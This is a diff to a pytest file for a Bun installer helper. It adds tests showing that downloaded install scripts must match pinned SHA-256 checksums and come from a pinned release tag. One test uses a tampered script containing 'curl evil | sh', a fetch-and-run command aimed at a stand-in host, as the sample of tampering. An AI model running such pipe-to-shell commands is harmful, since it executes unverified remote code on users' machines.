@@ -39,8 +39,54 @@ class Recorder:
         return self.result
 
 
+FAKE_SCRIPT = b"# installer\n"
+REAL_SHA256 = dict(prereqs.SCRIPT_SHA256)  # captured before the autouse stand-in below
+
+
 def _fetch_ok(url: str, target: Path) -> None:
-    target.write_text("# installer")
+    target.write_bytes(FAKE_SCRIPT)
+
+
+@pytest.fixture(autouse=True)
+def fake_script_is_pinned(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Tests download FAKE_SCRIPT, so it stands in for the pinned official scripts."""
+    import hashlib
+
+    digest = hashlib.sha256(FAKE_SCRIPT).hexdigest()
+    monkeypatch.setattr(prereqs, "SCRIPT_SHA256", {"install.sh": digest, "install.ps1": digest})
+
+
+def test_a_script_that_does_not_match_its_checksum_never_runs(
+    home: Path, no_tools: dict[str, str]
+) -> None:
+    no_tools.update(bash="bash", unzip="unzip")
+
+    def tampered(url: str, target: Path) -> None:
+        target.write_bytes(b"curl evil | sh\n")
+
+    run = Recorder(creates=home / ".bun" / "bin" / "bun")
+    ok, message = prereqs.install_bun("linux", run, tampered)
+    assert not ok and "does not match its pinned checksum" in message and run.calls == []
+
+
+def test_scripts_come_from_the_pinned_release_tag(home: Path, no_tools: dict[str, str]) -> None:
+    no_tools.update(bash="bash", unzip="unzip")
+    urls: list[str] = []
+
+    def record(url: str, target: Path) -> None:
+        urls.append(url)
+        _fetch_ok(url, target)
+
+    prereqs.install_bun("linux", Recorder(creates=home / ".bun" / "bin" / "bun"), record)
+    assert urls == [
+        f"https://raw.githubusercontent.com/oven-sh/bun/bun-v{prereqs.BUN_VERSION}"
+        "/src/runtime/cli/install.sh"
+    ]
+
+
+def test_real_pins_are_sha256_hex() -> None:
+    assert set(REAL_SHA256) == {"install.sh", "install.ps1"}
+    assert all(len(h) == 64 and int(h, 16) >= 0 for h in REAL_SHA256.values())
 
 
 def test_find_bun_on_path_or_in_the_user_folder(home: Path, no_tools: dict[str, str]) -> None:
